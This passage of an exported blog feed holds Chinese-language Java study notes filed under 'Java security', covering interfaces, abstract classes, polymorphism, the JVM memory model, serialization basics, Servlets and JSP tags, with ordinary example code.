    <content type="text"><![CDATA[0x01 接口在Java中，接口表示一种规范，要求实现者必须遵循这个规范，用来约束使用者该怎么做必须要求实现者提供具体的实现方法接口就是一个特殊的抽象类就算不实用abstract关键字，他在编译的时候也会自动在class文件中，在方法名前面加上public abstract 0x02 接口的特点 接口是没有构造器的，接口是不能创建对象 接口当中定义变量，会被当作是全局静态常量String name = “pino”; ====&gt;&gt;&gt; public static final String name = “pino”; 接口中定义的方法，都是公共的抽象方法 接口是可以继承的，并且是多继承，都好分割，但是类不能多继承 接口一般可以称为父类 接口也可以多实现，逗号分隔 实现接口的时候，子类要比接口中的类的方法权限大（一般都是public） 面向接口编程（赋值的时候，可以直接赋值给接口类型，多态的概念） 0x03 接口与抽象类的区别？ 相同： 都是被其他类实现或继承 都不能被实例化 都可以定义抽象方法，定义的抽象方法都必须得要覆盖 不同点： 接口是没有构造器的，抽象类是有的 抽象类可以包含普通方法，但是接口当中只能有抽象方法，不能有普通方法 接口默认的成员变量是public static final变量，抽象类当中是默认权限 接口当中的默认方法是public abstract 方法名 0x04 面向接口编程把实现类赋值给接口类型的变量 为什么使用？多态的好处：屏蔽了不同类之间的差异，从而实现通用编程]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的抽象]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E6%8A%BD%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[0x01 抽象方法 特点 没有方法体 抽象方法必须定义在抽象类或接口 不能是私有的，不能使用final，不能使用static 子类必须要覆盖此方法 0x02 抽象类抽象类必须得要有子类才行（抽象类一般都当作父类来继承） 抽象类是不能直接创建对象的 抽象类当中可以有抽象方法，也可以有普通方法（普通方法：给子类调用的） 子类没有覆盖抽象方法，把子类也变成抽象类，然后创建一个子孙类，让子孙类去覆盖 抽象类的构造方法不能定义为私有的（抽象方法必须得让子类继承之后，才能实现内部的方法体，因为子类如果继承的话，先去调用父类的构造方法） 抽象类不能使用final来修饰 抽象类不是一个完整的类，需要作为一个父类，子类才能完成对应的功能。抽象类命名时，喜欢在前面添加一个Abstract单词 抽象类与普通类的区别？ 普通类有的（字段，方法，构造器），抽象类都有 抽象类不能创建对象，抽象类可以包含抽象方法，也可以包含普通方法 抽象类必须有子类才有意义]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java当中的包装类、装箱和拆箱]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E5%BD%93%E4%B8%AD%E7%9A%84%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E5%92%8C%E6%8B%86%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[0x01 包装类对基本数据类型进行包装，把基本数据类型包装一个对象，从而获取更加强大的功能 基本数据类型 包装类 byte Byte short Short int Integer（内部覆盖到了toString方法，所以打印出来的不是地址而是具体的值） long Long float Float double Double char Character boolean Boolean 0x02 装箱操作12Integer num1 = new Integer(10); //方法一Integer num2 = Integer.valueOf(10);//方法二 在类中，成员变量一般使用包装类，在方法中一般使用基本数据类型。方法中，基本数据类型存储来栈中，而包装类存储在堆中。 0x03 拆箱操作把包装类转回基本数据类型 12Integer num = new Integer(10); //装箱int num2 = num.intValue(); //拆箱 类似的还有doubleValue()、longValue()等等 0x04 自动装箱与自动拆箱 自动装箱可以直接把一个基本数据类型的值赋值给包装类对象 1Integer num = 20; 自动拆箱可以直接把一个包装类对象赋值给基本数据类型的变量 1int num = Integer.valueOf(10); 0x05 包装类valueOf的缓存设计以Integer为例子，如果数值在-128到127之间（不同的包装类数值不同），会使用缓存机制，直接从之前创建的地方获取，超出这个范围则不实用缓存，直接创建新的地址。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的类加载和初始化问题]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x01 类加载问题什么时候加载类？ 当第一次使用该类对象的时候，去加载到JVM当中，并且只加载一次，下一次使用，直接从内存当中拿，在加载的时候会执行static 0x02 字段初始化问题 静态字段初始化，是在静态代码块当中执行 非静态字段初始化，是在构造器当中做的初始化 子类构造器会默认调用父类构造器]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的代码块]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9D%97%2F</url>
    <content type="text"><![CDATA[0x01 代码块在类中或方法中，使用{}花括号括起来的代码 分类 局部代码块 直接定义在方法内部中 初始化代码块 直接在类中定义代码块 初始化代码块在运行时还要把它放到构造方法当中 创建一个对象就会调用一次 静态代码块 在初始化代码块前加static，在加载成字节码时就会调用，也就是说在主方法前执行，并且只会执行一次]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的多态]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E5%A4%9A%E6%80%81%2F</url>
    <content type="text"><![CDATA[0x01 多态一个类对象有各种形态，比如狗是狗类，也是动物类，一个表示当前类，一个表示其父类 0x02 多态的特点 子类对象赋值给父类，运行时，表现的是子类的特征（先去找子类的方法） 字段不存在多态，字段前面是什么类型就调用谁的，在编译的时候已经确定要去调用谁的 怎么理解呢，看下面的代码 运行的时候发现结果是Super，不是说调用子类的特征吗？为什么不是Sub？答案就是刚才说的那样，在编译的时候已经决定了使用字段的类型。 0x03 多态的作用 当把不同子类对象都当作父类来看待，可以屏蔽不通过子类对象之间的差异性，从而达到通用编程的目的 使用多态后，只需要写一个方法就能达到相同的功能 0x04 类的强制类型转换把父类赋值给子类，在概念上与多态相反。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的继承]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[0x01 子类可以使用父类的哪些成员 父类的public，子类可以继承 protected也可以继承，不同包也能继承 如果子类与父类在同一个包中，子类可以继承父类的默认成员，但是不能继承不同包中的父类的默认成员 private是不能继承的 父类的构造器，子类也不能继承，因为构造器必须跟当前类名相同 0x02 方法的覆盖子类扩展了父类，就获得了父类的方法和成员，如果父类有些方法不适用于子类，可以重新定义这个方法，叫做方法的覆盖。 覆盖的原则 覆盖的方法必须跟父类当中的方法名相同 返回类型要相同 访问权限不能比父类小 0x03 继承的内存分析在类加载字节码时，会先判断有没有父类，如果有，会先把父类加载成字节码放到内存中，然后再把自己加载到内存中 0x04 this和super的对比 super()和this()构造方法都必须放在第一行 super和this不能同时一起使用 子类的构造方法中默认都有一个super()，尽管没有显示出来。 0x05 隐藏 子类跟父类有相同的变量名，叫做隐藏，子类通过”super.字段”来访问父类的成员 子类跟父类当中有相同的静态方法，称方法的隐藏 本垒字段隐藏：方法参数和本类字段名相同，使用”this.字段”来解决]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的this关键字]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84this%E5%85%B3%E9%94%AE%E5%AD%97%2F</url>
    <content type="text"><![CDATA[0x01 This关键字在方法中加入this，代表直接给对象当中的字段赋值。 this是当前正在使用的对象的地址 this的作用： 帮助我们区分成员变量和局部变量的二异性 在同类当中，实例方法的调用，前面其实是有this的，只不过给省略了 可以把this作为返回值返回 可以当作返回值 static和this不能同时使用 构造器的重载互调，this()；此时this代表的是构造器名，必须写到第一行。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的变量划分]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E5%88%92%E5%88%86%2F</url>
    <content type="text"><![CDATA[0x01 变量的划分 成员变量 直接定义在类中的变量 类成员变量：在成员变量前面加static 实例变量：没加static就是实例成员变量注意：在方法中不能定义static 局部变量 定义在方法当中的变量（参数，内部定的变量，代码块）必须要初始化之后使用 0x02 总结 类成员和实例成员的访问 在static方法中，只能调用static成员 非static方法中，可以访问静态成员也可以访问非静态成员 可以通过对象去调用静态成员（本质还是通过类名调用） 变量名称 存放位置 生命周期开始 声明周期结束 内存位置 类变量 字段，使用static 所在字节码加载到JVM 当JVM停止时 方法区 实例变量 字段，不使用static 创建所在类的对象 对象被回收的时候 堆 局部变量 方法参数，代码块，方法区 执行到初始化变量时 所在方法或代码块执行结束 栈]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java基本数据类型与引用数据类型]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[0x01 基本数据类型首先，了解一下基本数据类型有哪些 基本数据类型 备注 byte 8位 short 16位 char 16位 int 32位 float 32位 double 64位 long 64位 boolean 1位，只有true和false 基本数据类型只有一块存储空间，在栈中，存放的是具体的值 基本数据类型属于值传递（传递的是一个具体的值） 0x02 引用数据类型什么是引用数据类型？类接口数据枚举注解也就是说，使用new关键字创建出来的乐境都是引用数据类型 引用数据类型有两块存储空间，一个在栈中，一个在堆中，栈中存放的是堆中的地址。 引用数据类型属于地址传递（传递的是一个地址） 0x03 基本数据类型在堆中的初始化栈桢中的数据必须进行初始化，否则不能使用，但是堆中的数据可以不初始化就使用，因为有默认值。 数据类型 默认值 byte 0 short 0 int 0 long 0 float 0.0f double 0.0d char ‘/u0000’ boolean false String String虽然不是基本数据类型，但是也是有默认值的，是null]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVA内存了解一下]]></title>
    <url>%2F2018%2F05%2F30%2FJAVA%E5%86%85%E5%AD%98%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[0x01 前言要想java安全学的好，内存划分必不可少，对于分析java程序，了解内存的划分和运行机制对于安全研究是必不可少的一项技能，最近学习了一下，写了些笔记，分享一下。 0x02 Java内存划分 成员 作用 方法区 存放所有的class和static变量 栈 每执行一个函数，就创建一个栈桢，并加入栈中（每个函数从调用到执行结束，其实是对应一个栈桢的入栈和出栈） 本地方法区 为native方法服务 堆 被所有线程共享的一块区域，在虚拟机启动时就被创建了，所有的对象实例和数组都是在堆上分配的 程序计数器 当前线程所执行的字节码的行号指示器 0x03 栈例如写一段代码12345678910111213141516public class Person &#123; static void say(String name) &#123; System.out.println(&quot;My name is &quot; + name); &#125; public static void main(String[] args) &#123; String name = &quot;pino&quot;; say(name); &#125;&#125; 以这段代码为例子，当程序运行的时候，首先会运行main函数，那么就会先生成一个main函数的栈桢，然后存放栈中，而栈桢中存放的是成员变量，也就是这里的name属性了，接着，调用了say函数，那么就会相应的生成一个say函数的栈桢。当say函数执行结束后，say的栈桢就会从栈中出栈，然后main函数运行结束，main的栈桢也出栈，最后栈中就空了，整个程序就结束了。 以上就是栈的运行机制了，总结一下就是成员变量放在自己的栈桢中，执行函数时把栈桢入栈，方法执行完毕后，该方法的栈桢出栈。 0x04 堆堆的话，就像之前说的，所有的对象实例和数组都在堆上分配。简单的理解就是所有new创建的对象实例都是在堆上进行分配的，因为数组也是new出来的。 例如如下代码123456789public class Person &#123; public static void main(String[] args) &#123; int ages[] = new int[] &#123;1,2,3&#125;; &#125;&#125; 我这里创建了一个数组，那么具体的过程如下： 程序运行，调用main函数 生成main函数的栈桢，并存放到栈中 main的栈桢有一个成员变量ages int[] ages 是声明一个int类型的数组 new int[]{1,2,3} 是在堆中初始化数组（分配一块空间） 把初始化的地址赋值给ages 栈桢中的ages成员会指向堆中的那块空间 是的你没看错，赋值的是一个地址，不信你看 我把ages打印出来，结果确实是一个类似地址的字符串 那么具体点就是堆中存放这对象实例的地址，以及他的成员的值，比如这里它会存放： 位置0的值是1位置1的值是2位置2的值是3 当然，如果说有很多数组变量，那么内存空间可能会紧张，就会变成垃圾，等着垃圾回收器来回收。 0x05 垃圾回收机制Java是自动垃圾回收机制，不像c语言，需要自己来回收。当JVM发现内存不够时，会自动清理无用对象 JVM的垃圾回收机制中，判断一个对象是否死亡，并不是根据是否还有对象对其引用，而是通过可达性分析。对象之间的引用可以抽象为树形结构，通过树根作为起点，从这些树根往下搜索，搜索走过的链称为引用链，当一个对象到GC ROOTs没有任何引用链相连，则证明这个对象是不可用的，该对象会被判定为可回收的对象。 0x06 总结创建一个对象时，比如Person，方法区存放的是Person对象的字节码（Person.class）以及static等常量。new的时候，堆中分配一块区域，有对象的地址和对象属性的值栈中存放方法的栈桢，该栈桢存放成员变量，其值为实例化的对象的地址]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java序列化与反序列化基础]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[0x01 概述什么是序列化，简单的来说，序列化就是为了保存对象的状态；而反序列化就是把保存的对象状态再读出来。使用场景： 当想把内存中的对象状态保存到一个文件或者数据库中的时候 当想用套接字在网络上传送对象的时候 当想通过RMI传输对象的时候 0x02 Java支持序列化种类Java支持的序列化有三种 自定义实现Serializable接口的类 Java的基本类型 Java自带的实现了Serializable接口的类 下面用程序展示着三种情况 支持自定义实现Serializable接口的类：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class SerialTest1 &#123; private static final String TMP_FILE = &quot;.serialtest1.txt&quot;; public static void main (String args[]) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(TMP_FILE)); Box box = new Box(&quot;desk&quot;, 80, 48); out.writeObject(box); System.out.println(&quot;testWrite box:&quot; + box); out.close(); &#125;catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream(new FileInputStream(TMP_FILE)); Box box = (Box)in.readObject(); System.out.println(&quot;testRead box:&quot; + box); in.close(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Box implements Serializable &#123; private int width; private int height; private String name; public Box (String name, int width, int height) &#123; this.name = name; this.height = height; this.width = width; &#125; public String toString () &#123; return &quot;[&quot; + name + &quot;: (&quot; + width + &quot;, &quot; + height + &quot;) ]&quot;; &#125;&#125; 运行结果： 支持java的基本类型和自带的实现了Serializable接口的类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Map;import java.util.HashMap;import java.util.Iterator; public class SerialTest2 &#123; private static final String TMP_FILE = &quot;.serialabletest2.txt&quot;; public static void main(String[] args) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(TMP_FILE)); out.writeBoolean(true); out.writeByte((byte)65); out.writeChar(&apos;a&apos;); out.writeInt(20131015); out.writeFloat(3.14F); out.writeDouble(1.414D); HashMap map = new HashMap(); map.put(&quot;one&quot;, &quot;red&quot;); map.put(&quot;two&quot;, &quot;green&quot;); map.put(&quot;three&quot;, &quot;blue&quot;); out.writeObject(map); out.close(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream( new FileInputStream(TMP_FILE)); System.out.printf(&quot;boolean:%b\n&quot; , in.readBoolean()); System.out.printf(&quot;byte:%d\n&quot; , (in.readByte()&amp;0xff)); System.out.printf(&quot;char:%c\n&quot; , in.readChar()); System.out.printf(&quot;int:%d\n&quot; , in.readInt()); System.out.printf(&quot;float:%f\n&quot; , in.readFloat()); System.out.printf(&quot;double:%f\n&quot; , in.readDouble()); HashMap map = (HashMap) in.readObject(); Iterator iter = map.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry)iter.next(); System.out.printf(&quot;%-6s -- %s\n&quot; , entry.getKey(), entry.getValue()); &#125; in.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行结果 这里HashMap是java.util包中定义的类，它属于java自带的实现Serializable接口的类，它的接口声明如下：12public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable &#123;&#125; 0x03 序列化中的特例从上面说得，我们知道序列化/反序列化，只支持保存/恢复对象状态，即仅支持保存/恢复类的成员变量，但不支持保存类的成员方法，但是，序列化是不是对类的所有的成员变量的状态都能保存呢？答案是否定的。 序列化对static和transient变量，是不会自动进行状态保存的。transient的作用就是，用transient声明的变量，不会被自动序列化。 对于Socket, Thread类，不支持序列化。若实现序列化的接口中，有Thread成员；在对该类进行序列化操作时，编译会出错！ static与transient首先说一下序列化对static和transient的处理吧，我们将之前的代码中Box类修改一下123456789101112131415class Box implements Serializable &#123; private static int width; private transient int height; private String name; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 将成员变量的类型修改为static和transient，运行一下，结果： 前面说得，序列化不对static和transient变量进行状态保存的。因此，testWrite()中保存Box对象时，不 会保存width和height的值。但是为什么testRead()读出来的Box对象中width=80，而height=0呢？ 对于height，因为Box对象中height是int类型，而int类型默认是0，因此height为0. 而对于width，它是static类型，而static类型意味着所有Box对象都公用一个heith值，而在testWrite()中，我们已经将其初始化为80，因此，我们通过序列化读出来width也是80. 那么，如果我们想要保存static或transient变量，也是可以的，只要重写两个方法writeObject()和readObject()即可。还是Box类123456789101112131415161718192021222324252627class Box implements Serializable &#123; private static int width; private transient int height; private String name; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; private void writeObject(ObjectOutputStream out) throws IOException&#123; out.defaultWriteObject(); out.writeInt(height); out.writeInt(width); &#125; private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException&#123; in.defaultReadObject(); height = in.readInt(); width = in.readInt(); &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 在writeObject()方法中，out.defaultWriteObject()是使定制的writeObject()方法可以利用自动序列化中内置的逻辑 在readObject()方法中，in.defaultReadObject()也是使定制的readObject()方法可以利用自动序列化中内置的逻辑。 Socket、Thread类 在Box类中添加123456private Thread thread = new Thread() &#123; public void run() &#123; System.out.println(&quot;Serializable thread&quot;); &#125;&#125;; 运行发现，直接编译报错！ 事实证明，不能对Thread进行序列化，若希望程序能便宜通过，我们对Thread变量添加static或transient修饰符即可。 0x04 完全定制序列化过程Externalizable如果一个类要完全负责自己的序列化，则实现Externalizable接口，而不是Serializable接口。 Externalizable接口定义包括两个方法writeExternal()与readExternal()。需要注意的是：声明类实现Externalizable接口会有重大的安全风险。writeExternal()与readExternal()方法声明为public，恶意类可以用这些方法读取和写入对象数据。如果对象包含敏感信息，则要格外小心。实例：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.ObjectOutput; import java.io.ObjectInput; import java.io.Serializable; import java.io.Externalizable; import java.io.IOException; import java.lang.ClassNotFoundException; public class ExternalizableTest1 &#123; private static final String TMP_FILE = &quot;.externalizabletest1.txt&quot;; public static void main(String[] args) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(TMP_FILE)); Box box = new Box(&quot;desk&quot;, 80, 48); out.writeObject(box); System.out.println(&quot;testWrite box: &quot; + box); out.close(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream( new FileInputStream(TMP_FILE)); Box box = (Box) in.readObject(); System.out.println(&quot;testRead box: &quot; + box); in.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Box implements Externalizable &#123; private int width; private int height; private String name; public Box() &#123; &#125; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; public void writeExternal(ObjectOutput out) throws IOException &#123; &#125; public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 0x05 参考文献http://www.cnblogs.com/skywang12345/p/io_06.html]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java访问修饰符归纳]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E8%AE%BF%E9%97%AE%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%BD%92%E7%BA%B3%2F</url>
    <content type="text"><![CDATA[private ——— 仅对本类可见 protected ——— 对本包和子类可见 public ——— 对所有类可见 默认 ——— 对本包可见，继承也不行]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的static]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84static%2F</url>
    <content type="text"><![CDATA[0x01 static的作用static代表它修饰的那个东西是属于整个类的。 0x02 static的特点 static修饰的内容，是随着类的加载而加载。当JVM把字节码加载到虚拟机当中，static它修饰的成员会自动地加载到内存中（方法区） static修饰的内容，优先于对象存在 static修饰的内容，被该类对象所共享 static修饰的内容，可以通过类名来访问 static修饰的方法，在编译的时候就确定了其类型，所以用类来调用而不是对象来调用。 0x03 类中的成员类中的成员分为类成员和实例成员 类成员就是使用static修饰的成员实例成员就是不使用static修饰的成员]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Servlet]]></title>
    <url>%2F2018%2F05%2F30%2FServlet%2F</url>
    <content type="text"><![CDATA[0x01 概述Jsp的前身就是Servlet。Servlet是在服务器上运行的小程序，它就是一个java类，并且可以通过请求-响应编程模型来访问的这个驻留在服务器内存里的serlvet程序。 0x02 Tomcat容器等级Tomcat容器分为四个等级，Servlet的容器管理Context容器，一个Context对应一个Web工程。 0x03 编写Servlet 继承HttpServlet 重写doGet()或者doPost()方法 在web.xml中注册Servlet Servlet编写1234567891011121314151617181920212223242526import javax.servlet.http.HttpServletimport java.io.PrintWriterpublic class HelloServlet extends HttpServlet &#123; protected void doGet (HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Get request&quot;); resp.setContentType(&quot;text/html&quot;); PrintWriter out = resp.getWriter(); out.println(&quot;&lt;strong&gt;HelloServlet!&lt;/strong&gt;&lt;br&gt;&quot;); out.flush(); out.close(); &#125; protected void doPost (HttpServletRequest, req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Post request&quot;); resp.setContentType(&quot;text/html&quot;); PrintWriter out = resp.getWriter(); out.println(&quot;&lt;strong&gt;HelloServlet&lt;/strong&gt;&quot;); out.flush(); out.close(); &#125;&#125; 配置web.xml12345678&lt;servlet&gt; &lt;servlet-name&gt;HelloServlet&lt;servlet-name&gt; &lt;servlet-class&gt;servlet.HelloServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/servlet/HelloServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 在上面web.xml里，标签中的servlet.HelloServlet是我们编写的Servlet中的类名 中的url-pattern是要访问的url路径 0x04 Servlet与九大内置对象12345678910内置对象 怎样获得out resp.getWriter()request service方法的req参数response service方法的resp参数session req.getSession()函数application getServletContext()函数exception Throwablepage thispageContext PageContext Config getServletConfig()函数 0x05 Servlet执行顺序 构造方法 init初始化方法 service方法 –&gt; doGet()和doPost()方法 destroy方法]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Jsp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下命令行运行java程序]]></title>
    <url>%2F2018%2F05%2F30%2FWindows%E4%B8%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cjava%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[0x01 准备在运行java程序之前需要将环境变量配好，检查CLASSPATH和JAVA_HOME时候都弄好了 0x02 运行编译java文件1javac xxx.java xxx为java文件中的类名称，一定要相同才行，否则会报错这时，当前目录下会产生一个xxx.class文件 运行.class文件1java xxx 这里不用在后面加.class运行成功~]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsp学习笔记]]></title>
    <url>%2F2018%2F05%2F30%2Fjsp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x01 jsp的指令标签&lt;%@page %&gt; 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等。&lt;%@include%&gt; 包含其他文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。&lt;%@taglib%&gt; 引入标签库的定义。 0x02 jsp的动作标签与存取javabean有关（3只）jsp:usebean 加载一个将在JSP页面中使用的JavaBean。jsp:setProperty 设置已经实例化的Bean对象的属性第一种：12345用法：&lt;jsp:usebean id=&quot;myName&quot; /&gt;.....&lt;jsp:setProperty name=&quot;myName&quot; property=&quot;someProperty&quot; value=&quot;someValue&quot;/&gt;不管jsp:useBean是找到了一个现有的Bean，还是新创建了一个Bean实例，jsp:setProperty都会执行 第二种：12345用法：&lt;jsp:usebean id=&quot;myName&quot;&gt;&lt;jsp:setProperty name=&quot;myName&quot; property=&quot;someProperty&quot; value=&quot;someValue .../&gt;&lt;/jsp:usebean&gt;jsp:setProperty只有在新建Bean实例时才会执行，如果是使用现有实例则不执行jsp:setProperty。 name和property是必须的，前者选择要用哪个bean，一般是usebean的id属性，后者表示是要设置的变量名。jsp:getProperty获取Bean的属性的值并将之转化为一个字符串，将其插入到页面中1&lt;jsp:getProperty name=&quot;someName&quot; property=&quot;someProperty&quot;&gt; 基本动作元素（6只）jsp:include 包含静态和动态的文件。 插入文件的时间是在页面被请求的时候。1&lt;jsp:include file=&quot;xx.jsp&quot; flush=&quot;true&quot;&gt; jsp:forward 把请求转到另外的页面。1&lt;jsp:forward page=&quot;相对 URL 地址&quot; /&gt; jsp:plugin用来在JSP中嵌入Java插件123456789101112131415&lt;jsp:plugin&gt; type=&quot;bean | applet&quot; name=&quot;Applet名称&quot; code=&quot;java类名&quot; codebase=&quot;Java类所在目录&quot; align=&quot;对齐方式&quot; height=&quot;高度&quot; width=&quot;宽度&quot; hspace=&quot;水平间距&quot; vspace=&quot;垂直间距&quot; archive=&quot;预先加载的类列表&quot; jreversion=&quot;JRE版本&quot; iepluginurl=&quot;URL&quot; nspluginurl=&quot;URL&quot; &lt;/jsp:plugin&gt; jsp:paramjsp:params12345&lt;jsp:plugin&gt; &lt;jsp:params&gt; &lt;jsp:param name=&quot;参数名&quot; value=&quot;参数值&quot; /&gt; &lt;/jsp:params&gt; &lt;/jsp:plugin&gt; jsp:fallback用来指定当浏览器不支持或者无法启动Bean或Applet时，在页面上打印输出错误提示信息。12345&lt;jsp:plugin&gt; &lt;jsp:fallback&gt; 错误信息 &lt;/jsp:fallback&gt; &lt;/jsp:plugin&gt; 与JSP Document相关（6只）jsp:rootjsp:declarationjsp:scriptletjsp:expressionjsp:textjsp:output 与动态生成XML标签有关（3只）jsp:attributejsp:bodyjsp:element 与Tag File有关（2只）jsp:invokejsp:dobody #0x03 jsp内置对象 request对象来自客户端的请求，经过servlet容器处理后，由request对象进行封装 javax.servlet.http.HttpServletRequest类的实例1234567891011121314request.getParameter(key) 获取表单提交的相应key的值 （&lt;% String name = request.getParameter(&quot;name&quot;);&gt;）request.getParameterValue(key) 获取表单提交的一组数据 （&lt;% String[] 